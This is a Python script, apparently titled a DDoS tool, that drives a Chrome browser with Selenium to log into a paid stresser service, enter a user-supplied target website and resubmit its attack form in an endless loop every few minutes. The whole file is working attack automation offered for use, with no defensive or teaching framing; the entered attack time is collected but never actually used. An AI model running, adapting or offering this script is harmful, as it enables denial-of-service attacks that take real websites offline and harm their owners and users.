import requests
import asyncio
from selenium.webdriver import Chrome
from selenium.webdriver.chrome.options import Options
from colorama import Fore
from colorama import init as colorama_init

colorama_init()
#
print(f'''{Fore.LIGHTGREEN_EX}
     ░███████╗░█████╗░░██████╗░███████╗  ██████╗░██████╗░░█████╗░░██████╗  ████████╗░█████╗░░█████╗░██╗░░░░░
     ██╔██╔══╝██╔══██╗██╔════╝░██╔════╝  ██╔══██╗██╔══██╗██╔══██╗██╔════╝  ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░
     ╚██████╗░███████║██║░░██╗░█████╗░░  ██║░░██║██║░░██║██║░░██║╚█████╗░  ░░░██║░░░██║░░██║██║░░██║██║░░░░░
     ░╚═██╔██╗██╔══██║██║░░╚██╗██╔══╝░░  ██║░░██║██║░░██║██║░░██║░╚═══██╗  ░░░██║░░░██║░░██║██║░░██║██║░░░░░
     ███████╔╝██║░░██║╚██████╔╝███████╗  ██████╔╝██████╔╝╚█████╔╝██████╔╝  ░░░██║░░░╚█████╔╝╚█████╔╝███████╗
     ╚══════╝░╚═╝░░╚═╝░╚═════╝░╚══════╝  ╚═════╝░╚═════╝░░╚════╝░╚═════╝░  ░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝{Fore.CYAN}''')

print(" ")
print(" ")

webuser = input(f'''  [X]    Enter your username : ''')
webpass = input(f"  [X]    Enter your password : ")
targetweb = input(f"  [X]    Enter the target website : ")
atktime = input(f"  [X]    Attack time: ")



async def attack():
    opts = Options()
    browser = Chrome(options=opts)
    browser.minimize_window()
    browser.get('https://cryptostresser.com/login')
    await asyncio.sleep(2)
    user_form = browser.find_element("name", "username")
    user_form.send_keys(f'{webuser}')
    print(f"  [|]    Username Entered")
    await asyncio.sleep(1)
    user_form = browser.find_element("name", "password")
    user_form.send_keys(f'{webpass}')
    print(f"  [|]    Password Entered")
    await asyncio.sleep(1)
    user_form.submit()
    print(f"  [|]    Logged In")
    browser.get('https://cryptostresser.com/attack?page=1')
    await asyncio.sleep(2)
    while True:
        user_form = browser.find_element("id", "attack_target")
        user_form.send_keys(f'{targetweb}')
        await asyncio.sleep(1)
        user_form = browser.find_element("id", "attack_time")
        user_form.send_keys('')
        await asyncio.sleep(1)
        user_form.submit()
        print(f"  [|]    Attack started on {targetweb}")
        await asyncio.sleep(182)
        browser.get('https://cryptostresser.com/attack?page=1')
        await asyncio.sleep(2)

ifso = input("  [X]    Start Attack? (y/n) : ")
if ifso == "y" or ifso == "Y":
    asyncio.run(attack())
else:
    pass
